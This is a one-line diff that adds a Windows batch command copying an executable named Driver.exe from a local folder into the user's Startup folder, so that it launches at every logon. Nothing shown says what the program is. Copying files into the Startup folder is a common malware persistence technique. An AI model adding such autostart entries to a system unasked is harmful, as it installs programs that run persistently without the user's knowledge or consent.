@@ -1,0 +1,1 @@
+copy /b "C:\java\auto\Driver.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
